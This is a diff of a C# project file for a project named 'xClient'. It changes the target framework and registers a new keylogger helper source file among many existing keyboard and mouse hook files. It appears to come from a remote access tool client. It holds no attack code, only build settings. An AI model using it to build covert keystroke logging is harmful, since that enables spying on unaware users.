@@ -10,8 +10,9 @@
     <AppDesignerFolder>Properties</AppDesignerFolder>
     <RootNamespace>xClient</RootNamespace>
     <AssemblyName>Client</AssemblyName>
-    <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
+    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
+    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
   </PropertyGroup>
   <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
     <PlatformTarget>AnyCPU</PlatformTarget>
@@ -93,6 +94,7 @@
     <Compile Include="Core\Keylogger\Implementation\Subscribe.cs" />
     <Compile Include="Core\Keylogger\KeyEventArgsExt.cs" />
     <Compile Include="Core\Keylogger\KeyPressEventArgsExt.cs" />
+    <Compile Include="Core\Keylogger\LoggerHelper.cs" />
     <Compile Include="Core\Keylogger\MouseEventExtArgs.cs" />
     <Compile Include="Core\Keylogger\WinApi\AppMouseStruct.cs" />
     <Compile Include="Core\Keylogger\WinApi\CallbackData.cs" />
